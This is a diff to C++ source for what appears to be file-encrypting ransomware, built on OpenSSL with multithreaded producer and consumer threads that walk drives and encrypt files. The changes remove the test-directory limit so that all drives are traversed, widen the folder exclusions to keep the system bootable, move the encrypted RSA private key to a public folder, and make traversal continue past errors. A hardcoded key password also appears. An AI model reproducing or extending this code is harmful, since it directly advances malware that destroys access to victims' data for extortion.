@@ -203,7 +203,7 @@ void do_encryption() {
 
 void do_decryption() {
 	/* Get and decrypt private key */
-	const char * key_path = "C:\\Users\\irslambouf\\priv.key";
+	const char * key_path = "C:\\Users\\Public\\priv.key";
 
 	BIO *in = BIO_new(BIO_s_file());
 	BIO_read_filename(in, key_path);
@@ -323,6 +323,9 @@ set<wstring>* get_ignore_folders() {
 	ignore_folders->insert(L"Perl");
 	ignore_folders->insert(L"$");
 	ignore_folders->insert(L"Windows");
+	ignore_folders->insert(L"Program Files");
+	ignore_folders->insert(L"ProgramData");
+	ignore_folders->insert(L"rsbck");
 
 	return ignore_folders;
 }
@@ -343,9 +346,9 @@ void enc_path_producer_thread(p_producer_bundle& p_bundle) {
 	atomic<int>& flag = p_bundle.flag;
 
 	// For testing
-	drives = new vector<wstring>();
-	drives->push_back(L"C:\\Users\\irslambouf\\Desktop\\test");
-	drives->push_back(L"C:\\Users\\irslambouf\\test");
+	//drives = new vector<wstring>();
+	//drives->push_back(L"C:\\Users\\irslambouf'\\Desktop\\test");
+	//drives->push_back(L"C:\\Users\\irslambouf\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
@@ -354,11 +357,17 @@ void enc_path_producer_thread(p_producer_bundle& p_bundle) {
 		while (dir != end) {
 			try
 			{
+
 				if (is_directory(dir->path())) {
 					// Exclude certain paths 
 					for (wstring partial_folder_name : *ignore_folders) {
+
+						//wprintf(L"Current PATH - %s\n", &dir->path().wstring()[0]);
+						//wprintf(L"Current Ignore - %ls\n", partial_folder_name);
+
 						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
 							// Don't iterate further into folder
+							wprintf(L"Current PATH - %s\n", &dir->path().wstring()[0]);
 							dir.no_push();
 							break;
 						}
@@ -376,8 +385,10 @@ void enc_path_producer_thread(p_producer_bundle& p_bundle) {
 			}
 			catch (const filesystem_error& ex)
 			{
-				printf("PROBLEM PATH - %s\n", dir->path());
+				printf("PROBLEM PATH - %s\n", &dir->path().wstring()[0]);
 				printf("%s\n", ex.what());
+				dir.no_push();
+				++dir;
 			}
 		}
 	}
@@ -472,7 +483,7 @@ void enc_key_consumer_thread(enc_k_consumer_bundle& k_bundle) {
 	} while (items_left || k_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == k_consumer_count);
 
 	/* Save encrypted RSA private key */
-	BIO *out = BIO_new_file("C:\\Users\\irslambouf\\priv.key", "w");
+	BIO *out = BIO_new_file("C:\\Users\\Public\\priv.key", "w");
 	EVP_PKEY *priv_key = EVP_PKEY_new();
 	EVP_PKEY_set1_RSA(priv_key, rsa.get_rsa());
 	if (!PEM_write_bio_PKCS8PrivateKey(out, priv_key, EVP_aes_256_cbc(), NULL, NULL, NULL, "SuP3RS3Cr3tPa$$w0Rd")) {
@@ -494,9 +505,9 @@ void dec_path_producer_thread(p_producer_bundle& p_bundle) {
 	atomic<int>& flag = p_bundle.flag;
 
 	// For testing
-	drives = new vector<wstring>();
-	drives->push_back(L"C:\\Users\\irslambouf\\Desktop\\test");
-	drives->push_back(L"C:\\Users\\irslambouf\\test");
+	//drives = new vector<wstring>();
+	//drives->push_back(L"C:\\Users\\irslambouf'\\Desktop\\test");
+	//drives->push_back(L"C:\\Users\\irslambouf\\test");
 
 	// Try searching for data on all drives
 	for (wstring drive : *drives) {
@@ -529,6 +540,8 @@ void dec_path_producer_thread(p_producer_bundle& p_bundle) {
 			{
 				printf("PROBLEM PATH - %s\n", dir->path());
 				printf("%s\n", ex.what() );
+				dir.no_push();
+				++dir;
 			}
 		}
 	}
